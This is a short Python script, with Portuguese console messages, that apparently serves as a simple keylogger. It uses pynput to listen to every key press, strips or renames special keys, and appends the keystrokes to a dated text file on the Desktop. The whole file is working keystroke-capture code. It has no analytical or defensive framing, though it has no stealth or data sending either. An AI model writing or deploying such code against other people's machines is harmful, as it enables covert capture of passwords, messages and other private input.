from pynput.keyboard import Listener, Key
import re
import datetime

fileLog = "C:/Users/Usuário/Desktop/python/text.txt"
date = datetime.datetime.now().strftime("%d-%m-%Y")
fileName = f"{fileLog}{date}.txt"

def x(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            k = key.char
        else:
            k = str(key)

        k = re.sub(r'\'', '', k)
        k = re.sub(r'Key.space', ' ', k)
        k = re.sub(r'Key.enter', ' Enter', k)
        k = re.sub(r'Key.delete', ' Delete', k)
        k = re.sub(r'Key.esc', '', k)
        k = re.sub(r'Key.alt', '', k)
        k = re.sub(r'Key.ctrl', '', k)
        k = re.sub(r'Key.shift', '', k)
        k = re.sub(r'Key.backspace', ' Backspace', k)

        with open(fileName, "a") as log:
            log.write(k)
    except Exception as e:
        print(f"Erro ao gravar no arquivo: {e}")
        return

    print(f"Tecla registrada: {k}")

try:
    with Listener(on_press=x) as l:
        print("O código foi executado com sucesso. O Listener está ativo.")
        l.join()
except Exception as e:
    print(f"Erro ao iniciar o Listener: {e}")
